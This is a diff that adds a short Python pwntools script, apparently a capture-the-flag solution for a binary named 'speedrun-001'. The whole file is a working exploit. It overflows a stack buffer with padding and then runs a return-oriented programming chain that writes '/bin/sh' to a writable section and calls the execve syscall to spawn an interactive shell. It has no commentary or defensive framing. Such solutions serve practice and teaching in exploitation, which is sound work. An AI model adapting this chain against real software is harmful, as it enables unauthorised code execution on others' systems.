@@ -1,0 +1,27 @@
+from pwn import *
+
+p = process("./speedrun-001")
+
+pop_rdi = 0x0000000000400686
+pop_rsi = 0x00000000004101f3
+pop_rdx = 0x000000000044be16
+syscall = 0x000000000040129c
+mov_ptr_rsi_rax = 0x000000000047f471
+pop_rax = 0x0000000000415664
+rw_section = 0x6bc000
+ret = pop_rdi + 1
+
+payload = b"A" * 0x400 + b"B" * 8
+payload += p64(pop_rax) + p64(int.from_bytes(b"/bin/sh\x00", "little"))
+payload += p64(pop_rsi) + p64(rw_section)
+payload += p64(mov_ptr_rsi_rax)
+payload += p64(pop_rdi) + p64(rw_section)
+payload += p64(pop_rsi) + p64(0)
+payload += p64(pop_rdx) + p64(0)
+payload += p64(pop_rax) + p64(0x3b)
+payload += p64(ret)
+payload += p64(syscall)
+
+p.sendafter(b"words?\n", payload)
+
+p.interactive()
